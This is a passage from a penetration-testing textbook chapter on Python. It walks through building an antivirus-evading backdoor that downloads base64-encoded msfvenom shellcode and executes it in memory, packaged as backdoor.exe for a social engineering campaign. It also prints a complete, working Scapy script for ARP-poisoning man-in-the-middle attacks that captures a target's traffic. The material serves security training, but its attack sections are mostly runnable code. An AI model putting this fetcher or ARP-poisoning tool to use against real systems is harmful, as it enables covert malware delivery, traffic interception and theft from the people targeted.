<p class="source-code">C:\&gt; python –m pip install pyinstaller</p>
<p>This will fetch PyInstaller and get it ready for us. It’s a standalone command-line program, not a <a id="_idIndexMarker650"/>module, so you can run it from <a id="_idIndexMarker651"/>the same prompt with the <strong class="source-inline">pyinstaller</strong> command.</p>
<h2 id="_idParaDest-159"><a id="_idTextAnchor158"/>Preparing your raw payload</h2>
<p>Once again, we’re <a id="_idIndexMarker652"/>revisiting the ever-gorgeous <strong class="source-inline">msfvenom</strong>. We’re not doing anything new here, but if you’re not coming here from <a href="B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Exploitation with Metasploit</em>, I recommend checking out the coverage of <strong class="source-inline">msfvenom</strong> first. Let’s get started. Have a look at the following screenshot:</p>
<div>
<div class="IMG---Figure" id="_idContainer180">
<img alt="Figure 8.9 – Generating a raw payload with msfvenom " height="224" src="image/Figure_8.9_B17616.jpg" width="991"/>
</div>
</div>
<p class="figure-caption">Figure 8.9 – Generating a raw payload with msfvenom</p>
<p>Here, we have a quick and simple bind payload; this time, the target will be listening for our connection to spawn a shell. Note that I specified that null bytes should be avoided with <strong class="source-inline">--bad-chars</strong>, and that instead of generating an EXE file or any other special formatting, the <strong class="source-inline">-f raw</strong> parameter makes the output format raw: pure machine code in hexadecimal. The end result is 355 bytes, but since I’m not compiling or converting this into anything else, the newly created <strong class="source-inline">shellcode.raw</strong> file is 355 bytes.</p>
<p>Finally, the last step is creating a payload that will be staged from across the network. We’ll encode the file with <strong class="source-inline">base64</strong>, for one main reason and a possible side benefit. The main reason is that <strong class="source-inline">base64</strong> was designed to allow for easy representation of binary data, and thus it’s not likely to be mangled by some library function that tries to check for corruption or even prevent injection. The possible side benefit, depending on the defenses in place, is rendering the code so that it is harder to detect.</p>
<p><strong class="source-inline">base64</strong> encoding and decoding are built into Kali and available as a module in Python, so we can easily encode <strong class="source-inline">base64</strong> on our end and then write our script to quickly decode it before stuffing it into memory, as illustrated here:</p>
<div>
<div class="IMG---Figure" id="_idContainer181">
<img alt="Figure 8.10 – Shellcode in base64, ready for download " height="283" src="image/Figure_8.10_B17616.jpg" width="884"/>
</div>
</div>
<p class="figure-caption">Figure 8.10 – Shellcode in base64, ready for download</p>
<p>A side note about <strong class="source-inline">base64</strong>: though <strong class="source-inline">base64</strong> encoding is fairly popular in some systems as a means of hiding data, it’s merely a different base system and not encryption. Defenders <a id="_idIndexMarker653"/>should know to never rely on <strong class="source-inline">base64</strong> for confidentiality. </p>
<p>We’ve got our surprise waiting to be opened, but we still need the fetching code—let’s take a look.</p>
<h2 id="_idParaDest-160"><a id="_idTextAnchor159"/>Writing your payload retrieval and delivery in Python</h2>
<p>Now, let’s get back <a id="_idIndexMarker654"/>to Python and write the second phase of our attack. Keep in mind that we’re going to eventually end up with a Windows-specific EXE file, so this script will need to get to your Windows PyInstaller box. You could write it up on Kali and transfer it over, or just write it in Python on Windows to save a step.</p>
<p>Nine lines of code and a 355-byte payload are to be imported. Not too shabby, and a nice demonstration of how lightweight Python can be, as we can see here:</p>
<div>
<div class="IMG---Figure" id="_idContainer182">
<img alt="Figure 8.11 – The shellcode fetcher " height="230" src="image/Figure_8.11_B17616.jpg" width="863"/>
</div>
</div>
<p class="figure-caption">Figure 8.11 – The shellcode fetcher</p>
<p>Let’s examine this code step by step, as follows:</p>
<ul>
<li>We have three new <strong class="source-inline">import</strong> statements to look at. Notice that the first statement is <strong class="source-inline">from ... import</strong>, which means we’re being picky about which component of the source module (or, in this case, a package of modules) we’re going to use. In our<a id="_idIndexMarker655"/> case, we don’t need the entirety of <strong class="bold">Uniform Resource Locator</strong> (<strong class="bold">URL</strong>) handling; we’re only opening a single defined URL, so we pull in <strong class="source-inline">urlopen</strong>.</li>
<li>The <strong class="source-inline">ctypes</strong> import is a foreign function library; that is, it enables function calls in <a id="_idIndexMarker656"/>shared<a id="_idIndexMarker657"/> libraries (including <strong class="bold">dynamic-link libraries</strong> (<strong class="bold">DLLs</strong>)).</li>
<li><strong class="source-inline">urlopen()</strong> accesses the defined URL (which we have set up on our end by simply executing <strong class="source-inline">python -m SimpleHTTPServer</strong> in the directory where our <strong class="source-inline">base64</strong>-encoded payload is waiting) and stores the capture as <strong class="source-inline">pullhttp</strong>.</li>
<li>We use <strong class="source-inline">base64.b64decode()</strong> and pass as an argument <strong class="source-inline">pullhttp.read()</strong>, storing our raw shellcode as <strong class="source-inline">shellcode</strong>.</li>
<li>Now, we use some <strong class="source-inline">ctypes</strong> magic. <strong class="source-inline">ctypes</strong> is sophisticated enough for its own chapter, so I encourage further research on it; for now, we’re allocating some buffer space for our payload, using <strong class="source-inline">len()</strong> to allocate space of the same size as our payload itself. Then, we use <strong class="source-inline">ctypes.cast()</strong> to cast (make a type conversion of) our buffer space as a function pointer. The moment we do this, we now have <strong class="source-inline">exploit_func()</strong>—effectively, a Python function that we can call like any ordinary function. When we call it, our payload executes.</li>
<li>What else is there to do, then? We call our <strong class="source-inline">exploit_func()</strong> exploit function.</li>
</ul>
<p>In my example, I typed this up in Vim and stored it as <strong class="source-inline">backdoor.py</strong>. I copy it over to my Windows box and execute PyInstaller, using <strong class="source-inline">--onefile</strong> to specify that I want a single executable, as follows:</p>
<p class="source-code">pyinstaller --onefile backdoor.py</p>
<p>PyInstaller spits out <strong class="source-inline">backdoor.exe</strong>. Now, I just send this file as part of a social engineering campaign to encourage execution. Don’t forget to set up your HTTP server so that target instances of this script can grab the payload! In this screenshot, we can see <strong class="source-inline">backdoor.exe</strong> grabbing the payload as expected:</p>
<div>
<div class="IMG---Figure" id="_idContainer183">
<img alt="Figure 8.12 – The fetching code grabs the shellcode from SimpleHTTPServer " height="123" src="image/Figure_8.12_B17616.jpg" width="884"/>
</div>
</div>
<p class="figure-caption">Figure 8.12 – The fetching code grabs the shellcode from SimpleHTTPServer</p>
<p>Finally, let’s take a look at evasion using this technique. The payload itself set off no alarms during the import. Our executable itself, which is what an endpoint would see and thus is<a id="_idIndexMarker658"/> likely to be scanned, was only detected by 7% of antivirus products at the time of writing.</p>
<p>It’s time to take our <a id="_idIndexMarker659"/>Python networking to the next level. Let’s review some of our <strong class="bold">local area network</strong> (<strong class="bold">LAN</strong>) antics and get a feel for the low-level possibilities with Scapy.</p>
<h1 id="_idParaDest-161"><a id="_idTextAnchor160"/>Python and Scapy – a classy pair</h1>
<p>The romance<a id="_idIndexMarker660"/> between Python and Scapy was introduced in the second chapter—hey, I couldn’t wait. As a reminder, Scapy is a packet manipulation tool. We often see especially handy tools described as the Swiss Army knife of a certain task; if that’s the case, then Scapy is a surgical scalpel. It’s also, specifically, a Python program, so we can import its power into our scripts. You could write your own network pen testing tool in Python, and I mean any tool; you could replace Nmap, netcat, p0f, hping, and even something such as arpspoof. Let’s take a look at what it takes to create an <strong class="bold">Address Resolution Protocol</strong> (<strong class="bold">ARP</strong>) poisoning attack tool<a id="_idIndexMarker661"/> with Python and Scapy.</p>
<h2 id="_idParaDest-162"><a id="_idTextAnchor161"/>Revisiting ARP poisoning with Python and Scapy</h2>
<p>Let’s take a look at<a id="_idIndexMarker662"/> constructing<a id="_idIndexMarker663"/> a layer 2 ARP poisoning attack from the bottom up. As before, the code here is a skeleton; with some clever Python wrapped around it, you have the potential to add a powerful tool to your arsenal. First, we bring in our imports and make some declarations, as follows:</p>
<pre class="source-code">#!/usr/bin/python3 </pre>
<pre class="source-code">from scapy.all import * </pre>
<pre class="source-code">import os </pre>
<pre class="source-code">import sys </pre>
<pre class="source-code">import threading </pre>
<pre class="source-code">import signal </pre>
<pre class="source-code">interface = "eth0" </pre>
<pre class="source-code">target = "192.168.108.173" </pre>
<pre class="source-code">gateway = "192.168.108.1" </pre>
<pre class="source-code">packets = 1000 </pre>
<pre class="source-code">conf.iface = interface </pre>
<pre class="source-code">conf.verb = 0</pre>
<p>Check out those <strong class="source-inline">import</strong> statements—all of Scapy’s power. We’re familiar with <strong class="source-inline">os</strong> and <strong class="source-inline">threading</strong>, so let’s look at <strong class="source-inline">sys</strong> and <strong class="source-inline">signal</strong>. The <strong class="source-inline">sys</strong> module is always available to us when we’re Pythoning and it allows us to interact with the interpreter—in this case, we’re just using<a id="_idIndexMarker664"/> it to exit Python. The <strong class="source-inline">signal</strong> module lets your script work with signals (in an <strong class="bold">inter-process communication</strong> (<strong class="bold">IPC</strong>) context). Signals are messages sent to processes or threads about an event—an exception or something such as divide by zero. This gives our script the ability to handle signals.</p>
<p>Next, we define our interface, target IP, and gateway IP as strings. The number of packets to be sniffed is declared as an integer. <strong class="source-inline">conf</strong> belongs to Scapy; we’re setting the interface with the <strong class="source-inline">interface</strong> variable we just declared, and we’re setting verbosity to <strong class="source-inline">0</strong>.</p>
<p>Now, let’s<a id="_idIndexMarker665"/> dive into some<a id="_idIndexMarker666"/> functions, as follows:</p>
<pre class="source-code">def restore(gateway, gwmac_addr, target, targetmac_addr):</pre>
<pre class="source-code">   print("\nRestoring normal ARP mappings.")</pre>
<pre class="source-code">   send(ARP(op = 2, psrc = gateway, pdst = target, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gwmac_addr), count = 5)</pre>
<pre class="source-code">   send(ARP(op = 2, psrc = target, pdst = gateway, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = targetmac_addr), count = 5)</pre>
<pre class="source-code">   sys.exit(0)</pre>
<pre class="source-code">def macgrab(ip_addr):</pre>
<pre class="source-code">   responses, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_addr), timeout = 2, retry = 10)</pre>
<pre class="source-code">   for s,r in responses:</pre>
<pre class="source-code">     return r[Ether].src</pre>
<pre class="source-code">     return None</pre>
<pre class="source-code">def poison_target(gateway, gwmac_addr, target, targetmac_addr):</pre>
<pre class="source-code">   poison_target = ARP()</pre>
<pre class="source-code">   poison_target.op = 2</pre>
<pre class="source-code">   poison_target.psrc = gateway</pre>
<pre class="source-code">   poison_target.pdst = target</pre>
<pre class="source-code">   poison_target.hwdst = targetmac_addr</pre>
<pre class="source-code">   poison_gateway = ARP()</pre>
<pre class="source-code">   poison_gateway.op = 2</pre>
<pre class="source-code">   poison_gateway.psrc = target</pre>
<pre class="source-code">   poison_gateway.pdst = gateway</pre>
<pre class="source-code">   poison_gateway.hwdst = gwmac_addr</pre>
<pre class="source-code">   print("\nMitM ARP attack started.")</pre>
<pre class="source-code">   while True:</pre>
<pre class="source-code">     try:</pre>
<pre class="source-code">       send(poison_target)</pre>
<pre class="source-code">       send(poison_gateway)</pre>
<pre class="source-code">       time.sleep(2)</pre>
<pre class="source-code">     except KeyboardInterrupt:</pre>
<pre class="source-code">       restore(gateway, gwmac_addr, target, targetmac_addr)</pre>
<pre class="source-code">   return</pre>
<p>There’s a lot<a id="_idIndexMarker667"/> of <a id="_idIndexMarker668"/>information here, so let’s examine these functions more closely, as follows:</p>
<ul>
<li><strong class="source-inline">def restore()</strong> isn’t how we attack the network—it’s how we clean up our mess. Remember that ARP poisoning manipulates layer 2-layer 3 mappings on other nodes on the network. If you do this and disconnect, those tables stay the same until ARP messages dictate something else. We’re using Scapy’s <strong class="source-inline">send(ARP())</strong> function to restore healthy tables.</li>
<li><strong class="source-inline">def macgrab()</strong> will take an IP address as an argument, then use Scapy’s <strong class="source-inline">srp()</strong> function to create ARP messages and record the response. <strong class="source-inline">macgrab()</strong> reads <a id="_idIndexMarker669"/>the <strong class="bold">media access control</strong> (<strong class="bold">MAC</strong>) address with <strong class="source-inline">[Ether]</strong> and returns the value.</li>
<li><strong class="source-inline">def poison_target()</strong> is the function where our deception is laid out. We prepare the parameters for a Scapy <strong class="source-inline">send()</strong> function for both ends of the <strong class="bold">man-in-the-middle</strong> (<strong class="bold">MITM</strong>) attack: <strong class="source-inline">poison_gateway</strong> and <strong class="source-inline">poison_target</strong>. Although<a id="_idIndexMarker670"/> the multiple lines take up more space on the page, our script is highly readable, and we can see the structure of the packets being constructed: <strong class="source-inline">poison_target</strong> and <strong class="source-inline">poison_gateway</strong> are both set as <strong class="source-inline">ARP()</strong> with <strong class="source-inline">op = 2</strong>—in other words, we’re sending unsolicited ARP replies. The bait-and-switch is visible when the target’s <strong class="source-inline">psrc setting</strong> is set to <strong class="source-inline">gateway</strong>, and the gateway’s <strong class="source-inline">psrc</strong> setting is set to <strong class="source-inline">target</strong> (and the opposite for <strong class="source-inline">pdst</strong>). Our familiar <strong class="source-inline">while True</strong> loop is where the sending takes place. We see where signal handling comes in with <strong class="source-inline">except KeyboardInterrupt</strong>, which calls <strong class="source-inline">restore()</strong> so that we can get cleaned up.</li>
</ul>
<p>This is exciting, but<a id="_idIndexMarker671"/> we haven’t even<a id="_idIndexMarker672"/> started; we’ve defined these functions, but nothing calls them yet. Let’s get to work with the heavy lifting, as follows:</p>
<pre class="source-code">gwmac_addr = macgrab(gateway) </pre>
<pre class="source-code">targetmac_addr = macgrab(target) </pre>
<pre class="source-code">if gwmac_addr is None: </pre>
<pre class="source-code">   print("\nUnable to retrieve gateway MAC address. Are you connected?") </pre>
<pre class="source-code">   sys.exit(0) </pre>
<pre class="source-code">else: </pre>
<pre class="source-code">   print("\nGateway IP address: %s\nGateway MAC address: %s\n" % (gateway, gwmac_addr)) </pre>
<pre class="source-code">if targetmac_addr is None: </pre>
<pre class="source-code">   print("\nUnable to retrieve target MAC address. Are you connected?") </pre>
<pre class="source-code">   sys.exit(0) </pre>
<pre class="source-code">else: </pre>
<pre class="source-code">   print("\nTarget IP address: %s\nTarget MAC address: %s\n" % (target, targetmac_addr)) </pre>
<pre class="source-code">mitm_thread = threading.Thread(target = poison_target, args = (gateway, gwmac_addr, target, targetmac_addr)) </pre>
<pre class="source-code">mitm_thread.start() </pre>
<pre class="source-code">try: </pre>
<pre class="source-code">   print("\nMitM sniffing started. Total packets to be sniffed: %d" % packets) </pre>
<pre class="source-code">   bpf = "ip host %s" % target </pre>
<pre class="source-code">   cap_packets = sniff(count=packets, filter=bpf, iface=interface) </pre>
<pre class="source-code">   wrpcap('arpMITMresults.pcap', cap_packets) </pre>
<pre class="source-code">   restore(gateway, gwmac_addr, target, targetmac_addr) </pre>
<pre class="source-code">except KeyboardInterrupt: </pre>
<pre class="source-code">   restore(gateway, gwmac_addr, target, targetmac_addr) </pre>
<pre class="source-code">   sys.exit(0)</pre>
<p>Here’s<a id="_idIndexMarker673"/> what<a id="_idIndexMarker674"/> happens:</p>
<ul>
<li>We start out by calling <strong class="source-inline">macgrab()</strong> for the gateway and target IP addresses. Recall that <strong class="source-inline">macgrab()</strong> returns MAC addresses, which are then stored as <strong class="source-inline">gwmac_addr</strong> and <strong class="source-inline">targetmac_addr</strong>, respectively.</li>
<li>A possible return is <strong class="source-inline">None</strong>, so our <strong class="source-inline">if...else</strong> statement takes care of that: the value is printed to the screen unless it’s <strong class="source-inline">None</strong>, in which case the user is warned, and we call <strong class="source-inline">sys.exit()</strong>.</li>
<li>The <strong class="source-inline">threading.Thread()</strong> class defines <strong class="source-inline">poison_target()</strong> as our target function and passes the target and gateway information as arguments.</li>
<li><strong class="source-inline">mitm_thread.start()</strong> gets the attack rolling but as a thread. The program continues with a <strong class="source-inline">try</strong> statement.</li>
<li>This is where we set up our sniffer. This is an interesting use case for using Scapy from within Python; note that we construct a filter as a string variable called <strong class="source-inline">bpf</strong>. <strong class="source-inline">sniff()</strong> is called with returned data popping up in memory as <strong class="source-inline">cap_packets</strong>. <strong class="source-inline">wrpcap()</strong> creates a packet capture file in <strong class="source-inline">pcap</strong> format. Note that <strong class="source-inline">sniff()</strong> also passed the packet count as an argument, so what happens when this number is depleted? The code moves on to a <strong class="source-inline">restore()</strong> call. If a <em class="italic">Ctrl</em> + <em class="italic">C</em> input is received before that time, <strong class="source-inline">restore()</strong> is still called.</li>
</ul>
<p>As you can see, the <strong class="source-inline">print</strong> statements written in this demonstration are basic. I encourage you to make it prettier to look at.</p>
<p class="callout-heading">Don’t Forget to Route</p>
<p class="callout">Make sure your system is set up for forwarding packets with <strong class="source-inline">sysctl net.ipv4.ip_forward=1</strong>.</p>
<p>Use Wireshark <a id="_idIndexMarker675"/>or <a id="_idIndexMarker676"/>any packet sniffer to verify success. You wrote this from the bottom up, so knowing the targets’ layer 2 and layer 3 addresses is just half the battle—you want to make sure your code is handling them correctly. With ARP, it would be easy to swap a source and destination!</p>
<p>Once I’m done with my session, I can quickly verify that my packet capture was saved as expected. Better yet, open it up in Wireshark and see what your sniffer picked up. Here’s what it found:</p>
<div>
<div class="IMG---Figure" id="_idContainer184">
<img alt="Figure 8.13 – Our pcap file ready for review " height="114" src="image/Figure_8.13_B17616.jpg" width="731"/>
</div>
</div>
<p class="figure-caption">Figure 8.13 – Our pcap file ready for review</p>
<p>It’s so easy, the packet capture writes itself! I leave it to you to figure out how to incorporate<a id="_idIndexMarker677"/> these pieces into <a id="_idIndexMarker678"/>your own custom toolset.</p>
<h1 id="_idParaDest-163"><a id="_idTextAnchor162"/>Summary</h1>
<p>In this chapter, we ran through a crash course in Python for pen testers. We started with some basics about Python and picking your editor environment. Building on past programming experience and coverage in this book, we laid out code line by line for a few tools that could benefit a pen tester—a simple client, a simple server, and even a payload downloader that was almost completely undetectable by traditional antivirus programs. To wrap up the chapter, we explored low-level network manipulation with Scapy imported as a source library for our program.</p>
<p>Now that we have a solid foundation in Python, we’ll spend the next chapter taking a look at the Windows side of powerful automation and scripting: PowerShell.</p>
<h1 id="_idParaDest-164"><a id="_idTextAnchor163"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li>How are Python modules brought in to be used in your code?</li>
<li>How does the use of <strong class="source-inline">socket</strong> risk affect the portability of your script?</li>
<li>It’s impossible to run a Python script without <strong class="source-inline">#!/usr/bin/python3</strong> as the first line of code. (True | False)</li>
<li>What are two ways you could stop a <strong class="source-inline">while True</strong> loop?</li>
<li>PyInstaller can be run on any platform to generate Windows EXEs. (True | False)</li>
<li>In Python 3, <strong class="source-inline">thread</strong> became _________.</li>
<li>An ARP attack will fail completely without defining the <strong class="source-inline">restore()</strong> function. (True | False)</li>
</ol>
<h1 id="_idParaDest-165"><a id="_idTextAnchor164"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li>More information on Python IDEs: <a href="https://wiki.python.org/moin/IntegratedDevelopmentEnvironments">https://wiki.python.org/moin/IntegratedDevelopmentEnvironments</a></li>
<li>Installing Python on Windows (for access to <strong class="source-inline">pip</strong> and PyInstaller): <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></li>
<li>More information on the Mandiant Commando VM: <a href="https://www.mandiant.com/resources/commando-vm-windows-offensive-distribution">https://www.mandiant.com/resources/commando-vm-windows-offensive-distribution</a></li>
</ul>
</div>
</div></body></html>